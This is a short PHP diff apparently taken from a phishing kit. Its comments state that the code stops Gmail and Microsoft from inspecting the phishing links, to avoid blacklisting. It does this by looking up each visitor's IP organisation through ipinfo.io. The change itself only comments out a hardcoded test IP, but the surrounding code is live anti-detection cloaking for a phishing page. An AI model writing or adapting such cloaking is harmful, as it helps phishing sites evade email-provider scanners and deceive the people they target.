@@ -17,7 +17,7 @@ $allowed = "- *Accessed Phishing Site* -";
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
 $ip = $_SERVER['REMOTE_ADDR'];
 // Can set your IP manually to see what Google sees
-$ip = "9.9.9.9";
+//$ip = "8.8.8.8";
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 $org = $details->org;
 
